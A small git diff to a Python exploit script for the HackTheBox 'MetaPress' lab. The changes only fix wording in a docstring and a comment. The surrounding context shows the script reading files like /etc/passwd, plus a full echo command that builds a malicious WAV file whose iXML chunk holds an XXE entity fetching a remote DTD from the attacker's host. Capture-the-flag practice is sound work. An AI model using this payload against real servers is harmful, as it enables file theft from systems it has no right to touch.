@@ -13,7 +13,7 @@ Usage: python3 script.py [FILEPATH]
 Example: python script.py '/etc/passwd'
 
 Pre-requirements:
-    - Remote rhost is added in the "/etc/hosts" file i.e "10.10.11.186 metapress.htb"
+    - Remote host should be added in the "/etc/hosts" file i.e "10.10.11.186 metapress.htb"
     - HackTheBox VPN is connected on "tun0" interface
 """
 
@@ -164,7 +164,7 @@ def init_files(get_this, ip, server_port):
     fn2 = 'payload.wav'
     if not path.isfile(fn2):
 
-        # Create "payload.wav" manually. If generated file payload file not work.
+        # Create "payload.wav" manually. If generated payload file not work.
         """
         echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.32:8000/EXPLOIT.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
         """
